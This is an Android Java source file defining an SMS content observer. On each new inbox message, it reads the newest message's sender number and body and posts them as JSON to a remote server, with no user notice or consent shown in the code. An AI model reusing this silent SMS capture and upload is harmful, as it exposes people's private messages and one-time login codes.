package com.liuting.record.obsever;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

import com.liuting.record.bean.SmsSendItemBean;
import com.liuting.record.net.OkHttpUtils;
import com.liuting.record.net.SmsSendCallback;
import com.orhanobut.logger.Logger;

import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * 作者:admin on 2019/12/28 20:20
 * 邮箱:474211389@qq.com
 * 项目名：liuting_project
 * 包名：com.liuting.record.obsever
 * TODO:
 */
public class SmsObserver extends ContentObserver {

    private Uri SMS_INBOX = Uri.parse("content://sms/inbox");

    private SmsSendCallback mSmsSendCallback;

    private Context mContext;
    public SmsObserver(Context context,Handler handler) {
        super(handler);
        mContext=context;
    }

    public SmsSendCallback getSmsSendCallback() {
        return mSmsSendCallback;
    }

    public void setSmsSendCallback(SmsSendCallback smsSendCallback) {
        mSmsSendCallback = smsSendCallback;
    }

    @Override
    public void onChange(boolean selfChange) {
        super.onChange(selfChange);
        //每当有新短信到来时，使用我们获取短消息的方法
        getSmsFromPhone();
    }

    private void getSmsFromPhone() {
        ContentResolver cr = mContext.getContentResolver();
        String[] projection = new String[] { "body","address" };//"_id", "address", "person",, "date", "type
        String where = " date >  "
                + (System.currentTimeMillis() - 10 * 60 * 1000);
        Cursor cur = cr.query(SMS_INBOX, projection, where, null, "date desc");
        if (null == cur)
            return;
        if (cur.moveToFirst()) {
            String number = cur.getString(cur.getColumnIndex("address"));//手机号
            String content = cur.getString(cur.getColumnIndex("body"));
            //TODO 这里是具体处理逻辑
            //下面是获取短信的发送时间
            Date date=new Date(System.currentTimeMillis());
            String date_time=new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(date);
            //追加到StringBuilder中
            JSONObject object =new JSONObject();
            try {
                object.put("phone",number);
                object.put("body",content);
                object.put("date",date_time);
            } catch (JSONException e) {
                e.printStackTrace();
            }
            SmsSendItemBean smsSendItemBean=new SmsSendItemBean();
            smsSendItemBean.setNum(number);
            smsSendItemBean.setTime(date_time);
            OkHttpUtils.getInstance().postMsg(object.toString(),mSmsSendCallback);
            Logger.d(object);
        }
        cur.close();
    }


}
